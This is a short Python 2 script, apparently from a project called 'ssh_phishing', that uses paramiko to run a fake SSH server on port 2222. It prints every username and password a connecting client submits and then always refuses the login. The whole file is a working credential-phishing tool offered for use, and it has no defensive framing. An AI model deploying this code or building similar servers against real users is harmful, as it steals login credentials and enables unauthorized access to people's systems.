#!/usr/bin/env python
import logging
import socket
import sys
import threading
import paramiko

class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
        
    def check_auth_password(self, username, password):
        print "Username: " + username
        print "Password: " + password
        return paramiko.AUTH_FAILED
        
    def get_allowed_auths(self, username):
        return 'password'
            
def listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('', 2222)) # port number

    sock.listen(100)
    print "Waiting for connections..."
    client, addr = sock.accept()
    print "Connection from: " + client.getpeername()[0]
    print "Waiting for authentication..."

    t = paramiko.Transport(client)
    t.set_gss_host(socket.getfqdn(""))
    t.load_server_moduli()
    t.add_server_key(host_key)
    
    server = Server()
    t.start_server(server=server)

    server.event.wait(5)
    #t.close()


if len(sys.argv) != 2:
    print "Need private host RSA key as argument."
    sys.exit(1)
    
logging.basicConfig()
logger = logging.getLogger()
host_key = paramiko.RSAKey(filename=sys.argv[1])

while True:
    try:
        listener()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as exc:
        logger.error(exc)
        
# https://github.com/brerodrigues/ssh_phishing
